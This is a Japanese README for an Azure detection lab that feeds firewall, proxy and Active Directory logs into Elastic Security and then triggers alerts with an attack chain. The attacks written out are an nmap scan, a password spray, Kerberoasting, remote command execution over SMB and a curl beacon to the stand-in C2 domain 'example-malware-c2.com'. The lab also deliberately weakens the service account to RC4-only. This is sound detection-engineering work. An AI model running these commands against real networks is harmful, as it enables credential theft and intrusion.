# Elastic Security 攻撃シミュレーション ラボ（攻撃チェーン版）

OPNsense（ファイアウォール）/ Squid（プロキシ）/ Windows Server AD の 3 層ログ環境を Azure VM で再現し、Kali 相当の Ubuntu VM から攻撃チェーンを仕掛けて Elastic Security でアラートを検証するラボです。

ChatGPT からの改善提案のうち、Priority 1〜3 を反映した構成になっています。

1. **Password Spray 化**（1パスワード × 複数アカウント）+ Brute Force との違いを明確化
2. **SPN discovery を Kerberoasting の前段に明示**（列挙とチケット要求を分離）
3. **C2 を単発 curl から periodic beacon に変更**
4. **Sysmon 導入**（Process Creation / Network Connection / DNS Query）
5. **カスタム検知ルールの rule_id を `lab-v2-*` に統一**（`terraform-legacy/` の旧ルールと衝突しない）

## 構成

```
[external-subnet: 10.10.1.0/24]          [internal-subnet: 10.10.2.0/24]
┌─────────────────┐                       ┌─────────────────────────────┐
│ Kali (攻撃元)   │                       │ Windows Server AD           │
│ 10.10.1.10      │──→ OPNsense ──────────│ 10.10.2.10                  │
└─────────────────┘   WAN: 10.10.1.4      │                             │
                       LAN: 10.10.2.4     │ Ubuntu + Squid Proxy        │
                          │               │ 10.10.2.20                  │
                          │               └─────────────────────────────┘
                   NAT Gateway（WAN の出口）          │
                          │                    Elastic Cloud
                      Internet               (Agent / Syslog)
```

**ログソース:** OPNsense（ファイアウォール）/ Squid（プロキシ）/ Windows AD（認証・Sysmon）

リソースグループ: `contoso-seclab-v2` / VNet: `seclab-v2-vnet`

## 前提条件

- Azure サブスクリプション
- Azure CLI (`az login` 済み)
- Terraform >= 1.3
- Homebrew (`brew install qemu` は VHD を作り直すときだけ必要)
- Elastic Cloud 環境（Fleet Server・Elasticsearch）

## ネットワーク設計のポイント

Kali と AD を**別サブネット**に分離し、UDR（ユーザー定義ルート）で双方向の通信が OPNsense を経由するよう設定しています。これにより、Kali からの攻撃トラフィックが必ず OPNsense のファイアウォールログに記録されます。

| サブネット | アドレス | 配置VM |
|---|---|---|
| AzureBastionSubnet | 10.10.0.0/26 | Bastion |
| external-subnet | 10.10.1.0/24 | OPNsense WAN / Kali |
| internal-subnet | 10.10.2.0/24 | OPNsense LAN / AD / Squid |

### インターネットへの出口

internal-subnet の既定ルート（0.0.0.0/0）は UDR で OPNsense LAN（10.10.2.4）に向けています。OPNsense はそれを WAN（10.10.1.4）から外に出します。

新しい VNet のサブネットには Azure の既定の送信アクセスがなく、組織のポリシーで VM にパブリック IP も付けられません。そのため、external-subnet に **NAT Gateway**（`network.tf`）を付けて出口にしています。

- NAT Gateway は **TCP / UDP のみ**を通し、**ICMP は通しません。** `ping 8.8.8.8` や `ping www.google.com` は、正常でも失敗します。疎通確認には `curl -sI http://example.com` や `nc -zv <IP> 443` などを使ってください。
- Squid VM の `apt` や名前解決も、この出口を通ります。

## デプロイ手順

OPNsense は**設定済みの nano イメージ VHD**（`opnsense-nano-configured.vhd`）を使います。割り当て（WAN=hn0 / LAN=hn1）・**LAN の IP（10.10.2.4/24）**・WAN の Block 解除・443 許可ルールなどが保存済みなので、デプロイのたびに OPNsense を設定し直す必要はありません。

```bash
cd terraform
cat > terraform.auto.tfvars << 'EOF'
# keep_until を固定しないと locals.tf の timestamp() により apply のたびに
# タグを持つ全リソースが「更新」判定され、vm-ad の Run Command が毎回まとめて
# 再送されて Azure 側（ARM）の処理待ちで apply が長時間詰まることがある（実際に発生した）。
keep_until = "YYYY-MM-DD"

windows_admin_password = "..."
ad_safe_mode_password  = "..."
svc_account_password   = "..."
ssh_public_key         = "..."   # ~/.ssh/id_rsa.pub の中身
EOF
# （*.auto.tfvars は Terraform が自動で読み込むため source は不要。*.tfvars は git 管理外）
terraform init
./deploy.sh                       # 設定済み VHD（./opnsense-nano-configured.vhd）で Step 1 → アップロード → Step 2 を一括実行
./deploy.sh /path/to/other.vhd    # 別の VHD を使う場合
```

`deploy.sh` がやること:

1. `terraform apply -var opnsense_vhd_uri=""` — ストレージ・Bastion・AD・Squid・Kali を作成（OPNsense VM はスキップ）
2. `az storage blob upload` — VHD をアップロード（8 GB。同名 blob があれば上書き）
3. `opnsense.auto.tfvars` に blob URI を書き出して `terraform apply` — OPNsense VM を作成

ストレージに VHD を置きっぱなしにしない運用のため、`terraform destroy` で消し、毎回アップロードします。

AD DS インストール・DC 昇格・監査ポリシー・`svc-sql` 作成・Sysmon 導入は、DC 昇格後の再起動を確認してから `configure_audit_policy` / `create_svc_account` / `install_sysmon` が実行されるよう、再度 `terraform apply` してください。

### つまずきやすい点

- **`create_svc_account` が `Missing closing '}'` で失敗する**: スクリプト内の文字列リテラルに日本語があると、PowerShell 5.1 が ANSI で読んで引用符が化ける。文字列は ASCII のみにする（コメントは日本語で可）。
- **直したのに同じエラーが（修正前の行番号のまま）返る**: 同名で作り直すと VM 内のハンドラが古い結果を返す。run command の `name` を変える（現在は `create-svc-account-v3`）。
- **`The specified account already exists`**: 以前の試行で `svc-sql` だけ作られている。スクリプトは冪等（既存ならパスワード再設定、SPN は未登録時のみ登録）なので、そのまま再 apply すればよい。
- **`terraform apply` が異常に長く(30分〜1時間)かかる／`context deadline exceeded` で止まる**: 上記の `keep_until` を固定していないのが原因であることが多い。固定した上で `terraform plan` を実行し、`vm-ad` に対する Run Command 以外にも差分が出ていないか確認してから apply する。
- **Sysmon(`install_sysmon`)だけ失敗する**: OPNsense 起動直後は NAT Gateway 経由の出口がまだルーティングできておらず、スクリプト内のリトライ(最大10分)で待ってから失敗することがある。`terraform apply` をもう一度実行すれば通常は成功する。`azurerm_virtual_machine_run_command` は Azure 側の実行タイムアウト(既定30分)を Terraform から変更できないため、接続待ちを長くしすぎると `VMExtensionProvisioningTimeout` で強制終了される。

### 設定済み VHD が手元にない場合（作り直し）

**serial イメージは使えません。** ライブ（インストーラー）環境で、設定がメモリ上にしか載らず、停止すると消えます。ディスクにインストール済みの **nano** イメージを使います。

```bash
# 1. nano イメージをダウンロード・変換（Apple Silicon も同じコマンドで OK）
brew install qemu  # 未インストールの場合
curl -LO https://mirror.ams1.nl.leaseweb.net/opnsense/releases/24.7/OPNsense-24.7-nano-amd64.img.bz2
bunzip2 OPNsense-24.7-nano-amd64.img.bz2
truncate -s 8192M OPNsense-24.7-nano-amd64.img     # サイズを整数 MB に揃える
qemu-img convert -f raw -o subformat=fixed,force_size -O vpc \
  OPNsense-24.7-nano-amd64.img opnsense-nano.vhd

# 2. 素の VHD で ./deploy.sh opnsense-nano.vhd を実行し、OPNsense を設定する（下記「初期設定」）
#    設定後は VM を停止（az vm deallocate）してディスクのスナップショットを取り、VHD として保存する
RG=contoso-seclab-v2
az snapshot create -g $RG -n opnsense-configured-snap \
  --source $(az disk show -g $RG -n opnsense-osdisk --query id -o tsv) --sku Standard_LRS --tags <必須タグ>
SAS=$(az snapshot grant-access -g $RG -n opnsense-configured-snap \
  --duration-in-seconds 14400 --access-level Read --query accessSAS -o tsv)
# 途中で切れるので、完了するまで繰り返す（停止検知付き）
for i in $(seq 1 600); do
  curl -sS -C - --speed-limit 100000 --speed-time 30 --connect-timeout 20 \
    -o opnsense-nano-configured.vhd "$SAS" && break; sleep 2
done
az snapshot revoke-access -g $RG -n opnsense-configured-snap
```

`cmp opnsense-nano.vhd opnsense-nano-configured.vhd | wc -l` が 36 より大きければ、設定が入っています。**LAN の IP（10.10.2.4/24）が入っているか**は、設定前の VHD ではなく保存した VHD で `./deploy.sh <VHD>` を実行して確かめてください（OPNsense で何も設定せずに `ifconfig hn1` が 10.10.2.4、Squid から `curl -sI http://example.com` が 200 になること）。

ダウンロードしたスナップショットは、そのまま VHD として使えます（末尾に `conectix` のフッターがあり、サイズは 8,589,935,104 バイト）。変換は不要です。`qemu-img info -f vpc` で確認できます。

## VM への接続方法（すべて Bastion トンネル経由）

> **SSH のホストキー警告について:** トンネルの接続先はいつも `127.0.0.1:<ポート>` で、VM を作り直すとホストキーが変わるため、`REMOTE HOST IDENTIFICATION HAS CHANGED!` で接続できなくなります。ラボ用なので、`~/.ssh/config` に次を足すと警告が出なくなります。
>
> ```
> Host 127.0.0.1
>   StrictHostKeyChecking no
>   UserKnownHostsFile /dev/null
>   LogLevel ERROR
> ```
>
> 設定を足さずに 1 回だけ直すなら `ssh-keygen -R "[127.0.0.1]:10023"`（ポートは該当のもの）を実行します。

```bash
# 各トンネルコマンドは terraform output で確認
terraform output

# OPNsense 管理 GUI（別ターミナルでトンネルを張ってからブラウザで https://127.0.0.1:10443）
$(terraform output -raw opnsense_gui_tunnel) &

# Windows AD（RDP クライアントで localhost:13389 に接続）
$(terraform output -raw ad_rdp_tunnel) &

# Squid SSH
$(terraform output -raw squid_ssh_tunnel) &
  ssh elastic@127.0.0.1 -p 10023

# Kali SSH
$(terraform output -raw kali_ssh_tunnel) &
ssh elastic@127.0.0.1 -p 10024
```

### トンネルが残って `Defined port is currently unavailable` になるとき

前のトンネルのプロセスが残ってポートを握っています。次でまとめて終了できます（全 VM のトンネルが切れます）。

```bash
pkill -f "az.*bastion tunnel"
```

1 本だけ消すときは、ポートを握っているプロセスを探して `kill` します（例: OPNsense GUI の 10443）。

```bash
lsof -nP -iTCP:10443 -sTCP:LISTEN
pkill -f "bastion tunnel.*--port 10443"
```

## 初期設定

### OPNsense
1. Bastion トンネル経由でブラウザから `https://127.0.0.1:10443` にアクセス
2. 初期ログイン: `root` / `opnsense`
3. WAN: `hn0`（10.10.1.4）、LAN: `hn1`（10.10.2.4/24）を確認（設定済み VHD なら設定済み。素の VHD では LAN の IP を、シリアルコンソールのメニュー `2` で設定する）
4. Firewall → Rules でラボ用ポリシーを設定
5. System → Settings → Logging で Syslog を Squid VM（10.10.2.20）の 514 番に設定

### Windows Server AD
1. Bastion RDP で接続（localhost:13389）
2. Elastic Agent をインストール（Fleet URL・Enrollment Token を設定）
3. AD DS は `terraform apply` 時に自動インストール済み（再起動後に完了）
4. 監査ポリシー・`svc-sql`・Sysmon は `configure_audit_policy` / `create_svc_account` / `install_sysmon` の run_command を手動実行（DC 昇格後の再起動後）

### Squid（Ubuntu）
1. Bastion SSH で接続
2. Squid は cloud-init で自動インストール・起動済み
3. Elastic Agent をインストールして Squid Integration を設定
4. OPNsense の Syslog 受信ポート（514）を Elastic Agent の FortiGate/OPNsense Integration で受け取る

```bash
# Elastic Agent インストール例（Fleet URL と Token を Elastic Cloud から取得して設定）
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.x.x-linux-x86_64.tar.gz
tar xzvf elastic-agent-8.x.x-linux-x86_64.tar.gz
cd elastic-agent-8.x.x-linux-x86_64
sudo ./elastic-agent install \
  --fleet-server-es=https://<your-es-endpoint>:443 \
  --enrollment-token=<your-token>
```

## 攻撃シナリオ（攻撃チェーン版）

Kali に SSH 接続してから実行します。`elastic` が AD のビルトイン管理者（RID 500）です（`vm_ad.tf` が `admin_username = local.admin_username` で作成しており、`administrator` という名前のアカウントはこの AD には存在しません）。

```bash
$(terraform output -raw kali_ssh_tunnel) &
ssh elastic@127.0.0.1 -p 10024
```

### 1. Network / Port Scan（Reconnaissance）
```bash
nmap -sn 10.10.2.0/24
nmap -sV -p 22,80,135,139,389,443,445,3389 10.10.2.10
```
**期待されるログ:** OPNsense ファイアウォールログ（アラートは想定しない。後続の攻撃と相関させる材料として残す）

### 2. Password Spray（Credential Attack）
1ユーザーに複数パスワードを試す Brute Force ではなく、**1パスワードを複数ユーザーに試す** Password Spray にします。候補アカウントは実在しなくても 4625（サブステータス `0xC0000064`: ユーザー名が存在しない）が記録されるため、事前に AD 側でダミーアカウントを作る必要はありません。

```bash
cat > /tmp/userlist.txt << 'EOF'
elastic
administrator
guest
svc-backup
svc-sql
test
EOF
nxc smb 10.10.2.10 -u /tmp/userlist.txt -p 'rE0!6ZsTq9Fo'
```
**期待されるログ:** AD Event ID 4625（他ユーザーは失敗）→ 4624（`elastic` のみ成功）
**期待されるアラート:** `SMB Password Spray / Brute Force Followed by Successful Logon (Lab v2)`（カスタムルール。ユーザー名でフィルタしていないため、このまま発火する）

### 3. Discovery（共有列挙）
```bash
nxc smb 10.10.2.10 -u elastic -p 'rE0!6ZsTq9Fo' --shares
```
**期待されるログ:** AD Event ID 4624（成功ログオン）/ OPNsense 内部トラフィックログ

### 4. SPN Discovery → Kerberoasting（Credential Access）
列挙（LDAP 問い合わせのみ）と TGS 要求を分けて実行し、「まず調べてから取りにいく」流れを明示します。

```bash
# 1) 列挙のみ（-request を付けない。TGS 要求は発生しない）
GetUserSPNs.py lab.local/elastic:'rE0!6ZsTq9Fo' -dc-ip 10.10.2.10

# 2) 列挙で見つけた SPN に対して TGS を要求する
GetUserSPNs.py lab.local/elastic:'rE0!6ZsTq9Fo' -dc-ip 10.10.2.10 -request
```
`svc-sql` は RC4 のみ許可（`vm_ad.tf` の `create_svc_account` / Server 2022 の既定 RC4 拒否を回避するための意図的な弱い設定）なので、2) の既定の RC4 要求がそのまま検知ルールに一致します。

**期待されるログ:** AD Event ID 4769（TGS チケット要求、`TicketEncryptionType: 0x17`）
**期待されるアラート:** `Newly Observed RC4 Kerberos Service Ticket Request`（Elastic 組み込みルール）

> **注意: このルールは New Terms 型で、同じ (要求元ユーザー, サービス) の組み合わせでは7日間に1回しか発火しない。** `new_terms_fields` は `TargetUserName` / `ServiceName`、`history_window_start` は `now-7d`。`elastic → svc-sql` の組み合わせで一度アラートが出た後は、ログ自体は毎回正しく記録されても、7日以内の再実行ではアラートが再発火しない（バグではなく仕様）。新しくアラートを出したい場合は、別アカウント・別 SPN で実行するか、7日待って履歴ウィンドウから外す必要がある。

### 5. Lateral Movement / Remote Command Execution
```bash
nxc smb 10.10.2.0/24 -u elastic -p 'rE0!6ZsTq9Fo' --shares
nxc smb 10.10.2.10 -u elastic -p 'rE0!6ZsTq9Fo' -x "whoami"
```
Sysmon 導入後は、この `-x` 実行に対応する **Process Creation（Sysmon Event ID 1）** が AD VM 側に記録されます。4624（SMB認証）→ Sysmon EID 1（`cmd.exe` の起動）という Authentication → Execution の相関が見えるようになります。

> Event ID 4648（明示的資格情報によるログオン）は Windows クライアント側で記録されるイベントのため、攻撃元が Linux（Kali・nxc）のこの構成では発生しません。

**期待されるアラート:** `Successful SMB Logon to AD from Attack Subnet (Lab v2)`（カスタムルール）

### 6. External Communication（Periodic Beacon）
単発の `curl` ではなく、一定間隔でのアクセスにして beacon らしい周期性を Squid ログに残します。

```bash
for i in $(seq 1 6); do
  curl --proxy http://10.10.2.20:3128 "http://example-malware-c2.com/beacon?id=$i"
  sleep 60
done
```
**期待されるログ:** Squid アクセスログに約60秒間隔で同一ドメインへのアクセスが記録される
**期待されるアラート:** `Suspicious C2-like Domain Access via Squid Proxy (Lab v2)`（カスタムルール。ドメイン名一致なので周期実行でも同一ロジックで発火する。6回とも別々のアラートとして発火するか、Kibana 側で同一ルールの連続発火として束ねて確認する）

## Sysmon

`vm_ad.tf` の `azurerm_virtual_machine_run_command.install_sysmon` で、Microsoft Sysinternals から Sysmon をダウンロードし、Process Creation（EID 1）/ Network Connect（EID 3）/ DNS Query（EID 22）を除外なし（全件記録）で有効化します。`configure_audit_policy` / `create_svc_account` と同様、DC 昇格後の再起動を経てから改めて `terraform apply` する運用です。

Elastic Agent 側は Windows integration の Sysmon 用データストリーム（`logs-windows.sysmon_operational-*` 相当）でこれらのイベントを収集してください（Fleet の「Windows」統合に Sysmon の収集設定が含まれています）。

## Elastic Security でのアラート確認

1. Kibana → Security → Rules → Enable Rules
2. 以下のルールカテゴリを有効化:
   - **Windows** - Brute Force, Lateral Movement, Kerberos
   - **Network** - Port Scan, Suspicious Connections
   - **Threat Detection** - C2 Communication
3. Security → Alerts で発火したアラートを確認
4. Timeline でログを横断相関（OPNsense → Squid → AD）

### カスタム検知ルール

組み込みルールだけではシナリオ 2・5・6 のアラートが発火しないため（RC4 限定・Squid 非対応・NTLM の `TargetUserSid` 制約など）、Kibana にカスタムルールを追加しています。

**Elastic Cloud を作り直したときは `setup-detection-rules.sh` を実行してください。** Prebuilt rule 一式のインストール・シナリオ4用ルールの有効化・カスタムルール3件の作成（再実行時は更新）を一括で行います。

```bash
export ELASTIC_API_KEY="<Kibana/ES 共用の ApiKey>"
export KIBANA_URL="https://<deployment>.kb.<region>.<cloud>.elastic.cloud"
./setup-detection-rules.sh
```

| rule_id | 名前 | 種別 | 対象 |
|---|---|---|---|
| `lab-v2-smb-bruteforce-success` | SMB Password Spray / Brute Force Followed by Successful Logon (Lab v2) | EQL | シナリオ 2 |
| `lab-v2-squid-suspicious-c2-domain` | Suspicious C2-like Domain Access via Squid Proxy (Lab v2) | KQL | シナリオ 6 |
| `lab-v2-smb-lateral-movement-from-attack-subnet` | Successful SMB Logon to AD from Attack Subnet (Lab v2) | KQL | シナリオ 5 |

クエリの内容は Kibana → Security → Rules → 該当ルール名 → Edit rule settings で確認できます。

## CMDB 風データの投入（AI Agent / RAG 検証用）

`load-cmdb.sh` で、ホスト / アカウント / 脅威情報 / ポリシー / Runbook をまとめた架空の CMDB データを Elasticsearch（`cmdb-assets` インデックス、ELSER による semantic_text）に投入できます。攻撃シナリオ本体とは独立した用途です。

```bash
export ELASTIC_URL=https://<es-endpoint>
export ELASTIC_API_KEY=<encoded api key>
./load-cmdb.sh
```

## 未実装（コストと作業量の都合で保留）

- Controlled C2 endpoint（外部サイト依存を切る自前の模擬 C2。新規 VM なしで Squid VM に同居させる案が低コスト）
- 複数 SPN サービスアカウント
- 複数 Windows ホストによる本格的なラテラルムーブメント（新規 VM 追加が必要。タグ・Bastion 必須などの制約を満たしつつ追加するコスト対効果を見て判断）

## コスト管理

使わないときは VM を停止して課金を抑えます。

```bash
# 停止
az vm deallocate --resource-group contoso-seclab-v2 --name vm-opnsense
az vm deallocate --resource-group contoso-seclab-v2 --name vm-ad
az vm deallocate --resource-group contoso-seclab-v2 --name vm-squid
az vm deallocate --resource-group contoso-seclab-v2 --name vm-kali

# 再開
az vm start --resource-group contoso-seclab-v2 --name vm-opnsense
az vm start --resource-group contoso-seclab-v2 --name vm-ad
az vm start --resource-group contoso-seclab-v2 --name vm-squid
az vm start --resource-group contoso-seclab-v2 --name vm-kali
```

| 状態 | 概算コスト |
|---|---|
| 全 VM 稼働中 | 約 ¥900/日 |
| 全 VM 停止中 | 約 ¥50/日（ディスク代のみ） |

> 上の金額は NAT Gateway を足す前の概算です。NAT Gateway・パブリック IP・Bastion は VM を停止しても課金が続くので、使わない期間が長いときは `terraform destroy` を検討してください。

## 環境の削除

```bash
terraform destroy
```

> **注意:** 設定済みの OPNsense VHD（`opnsense-nano-configured.vhd`）は手元に必ず保管してください。destroy するとストレージの VHD も消えるので、次回は `./deploy.sh` で再アップロードします。
